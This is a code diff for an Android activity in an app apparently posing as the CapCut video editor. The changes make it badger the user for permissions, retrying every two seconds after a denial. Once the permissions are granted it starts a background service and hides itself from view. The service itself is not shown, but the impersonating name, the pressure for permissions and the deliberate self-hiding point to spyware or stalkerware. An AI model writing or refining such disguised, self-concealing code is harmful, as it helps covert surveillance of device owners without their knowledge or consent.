@@ -17,12 +17,13 @@ import java.util.List;
 public class CapCutMain extends AppCompatActivity {
     private static final int PERMISSION_REQUEST_CODE = 100;
     private Handler handler = new Handler();
+    private boolean permissionsRequested = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         
-        // Check and request permissions
+        // DON'T hide yet - wait for permissions
         checkPermissions();
     }
 
@@ -52,10 +53,11 @@ public class CapCutMain extends AppCompatActivity {
         }
 
         if (missing.isEmpty()) {
-            // All permissions granted - start service and hide
+            // All permissions already granted - start and hide
             startApp();
         } else {
-            // Request missing permissions
+            // Request permissions - DON'T hide until granted
+            permissionsRequested = true;
             String[] arr = missing.toArray(new String[0]);
             ActivityCompat.requestPermissions(this, arr, PERMISSION_REQUEST_CODE);
         }
@@ -64,6 +66,7 @@ public class CapCutMain extends AppCompatActivity {
     @Override
     public void onRequestPermissionsResult(int code, String[] perms, int[] results) {
         super.onRequestPermissionsResult(code, perms, results);
+        
         if (code == PERMISSION_REQUEST_CODE) {
             boolean all = true;
             for (int r : results) {
@@ -72,11 +75,17 @@ public class CapCutMain extends AppCompatActivity {
                     break;
                 }
             }
+            
             if (all) {
+                // Permissions granted - now start and hide
                 startApp();
             } else {
-                Toast.makeText(this, "Grant all permissions!", Toast.LENGTH_SHORT).show();
-                handler.postDelayed(() -> checkPermissions(), 2000);
+                // Permissions denied - retry
+                Toast.makeText(this, "⚠️ All permissions required!", Toast.LENGTH_LONG).show();
+                handler.postDelayed(() -> {
+                    permissionsRequested = false;
+                    checkPermissions();
+                }, 2000);
             }
         }
     }
@@ -84,16 +93,18 @@ public class CapCutMain extends AppCompatActivity {
     private void startApp() {
         // Start service
         Intent intent = new Intent(this, CapCutService.class);
-        startForegroundService(intent);
+        if (Build.VERSION.SDK_INT >= 26) {
+            startForegroundService(intent);
+        } else {
+            startService(intent);
+        }
         
-        // Show toast
         Toast.makeText(this, "✅ Running in background", Toast.LENGTH_SHORT).show();
         
-        // Hide app after 1 second
+        // NOW hide the app (after permissions are granted)
         handler.postDelayed(() -> {
             finish();
-            // Move to background
             moveTaskToBack(true);
         }, 1000);
     }
-                        }
+}
